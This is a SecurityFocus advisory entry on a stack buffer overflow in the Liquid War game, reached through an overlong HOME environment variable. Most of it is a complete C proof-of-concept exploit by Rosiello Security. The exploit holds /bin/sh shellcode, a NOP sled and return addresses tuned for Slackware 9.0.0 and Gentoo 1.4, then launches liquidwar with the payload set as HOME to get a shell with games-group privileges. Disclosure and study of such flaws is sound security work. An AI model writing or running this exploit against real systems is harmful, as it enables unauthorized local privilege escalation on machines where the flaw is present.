source: http://www.securityfocus.com/bid/8629/info

Liquid War has been reported prone to a buffer overflow condition when handling HOME environment variables of excessive length.

The issue presents itself, due to a lack of sufficient boundary checks performed on data contained in the HOME environment variable before it is copied into a reserved buffer in stack based memory. It has been reported that a local attacker may exploit this condition to execute arbitrary instructions with GID Games privileges. 

/*
*
*                             http://www.rosiello.org
*                              (c) Rosiello Security
*
* Copyright Rosiello Security 2003
* All Rights reserved.
*
* Tested on Slakware 9.0.0 & Gentoo 1.4
*
* Author: Angelo Rosiello
* Mail  : angelo@rosiello.org
* URL   : http://ww.rosiello.org
*
* Greetz: Astharot by Zone-H who posted the stack overflow bug
*
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

/* /bin/sh */
static char shellcode[]=
"\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"
"\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";

#define NOP     0x90
#define LEN     520           //Buffer for Slackware 9.0.0
//#define LEN   528           //Buffer for Gentoo 1.4
#define RET     0xbffff414    //Valid Address for Slackware 9.0.0
//#define RET   0xbffff360    //Valid Address for Gentoo 1.4

int main()
{
        char buffer[LEN];
        long retaddr = RET;
        int i;


        fprintf(stderr, "\n(c) Rosiello Security 2003 - http://www.rosiello.org\n");
        fprintf(stderr, "Liquidwar's exploit for Slackware 9.0.0\n");
        fprintf(stderr, "by Angelo Rosiello - angelo@rosiello.org\n\n");
        fprintf(stderr, "using address 0x%lx\n",retaddr);

        for (i=0;i<LEN;i+=4) *(long *)&buffer[i] = retaddr;

        for (i=0;i<(LEN-strlen(shellcode)-50);i++) *(buffer+i) = NOP;

        memcpy(buffer+i,shellcode,strlen(shellcode));

        /* export the variable, run liquidwar */

        setenv("HOME", buffer, 1);
        execl("/usr/games/liquidwar","liquidwar",NULL);

        return 0;
}

